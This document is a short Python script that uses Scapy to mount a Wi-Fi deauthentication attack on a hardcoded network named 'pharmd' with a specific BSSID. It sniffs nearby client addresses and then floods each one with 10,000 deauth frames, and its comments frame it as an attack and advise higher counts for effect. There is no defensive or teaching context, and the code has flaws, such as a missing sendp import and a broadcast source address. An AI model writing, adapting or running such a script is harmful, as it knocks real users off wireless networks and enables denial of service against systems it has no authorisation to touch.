from scapy.all import sniff, RadioTap, Dot11, Dot11Deauth

# Set the target Wi-Fi network details
target_ssid = "pharmd"
target_bssid = "d8:0f:99:6c:e1:e5"

# Set the deauth packet count (higher values will make the attack more effective)
deauth_count = 10000

# Set the wireless adapter interface name (adjust as needed)
iface_name = "Wi-Fi"

# Function to send deauth packets
def send_deauth(target_mac, src_mac, bssid):
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2=src_mac, addr3=bssid) / Dot11Deauth()
    sendp(deauth_packet, inter=0.1, count=deauth_count, iface=iface_name, verbose=1)
    print(f"Sent {deauth_count} deauth packets to {target_mac} from {src_mac} on BSSID {bssid}")

# Function to scan for devices on the target network
def scan_devices():
    devices = []
    print("Scanning for devices on the network...")
    packets = sniff(iface=iface_name, count=100)

    for packet in packets:
        if packet.haslayer(Dot11):
            if packet.addr2 not in devices and packet.addr2 != target_bssid:
                devices.append(packet.addr2)
                print(f"Found device: {packet.addr2}")

    return devices

# Main function
def main():
    print(f"Targeting Wi-Fi network: {target_ssid} (BSSID: {target_bssid})")
    devices = scan_devices()

    if not devices:
        print("No devices found on the network.")
        return

    choice = input("Do you want to disconnect all devices from the network? (y/n): ")
    if choice.lower() == "y":
        for device in devices:
            send_deauth(device, "FF:FF:FF:FF:FF:FF", target_bssid)

    print("Deauth attack completed.")

# Run the main function
if __name__ == "__main__":
    main()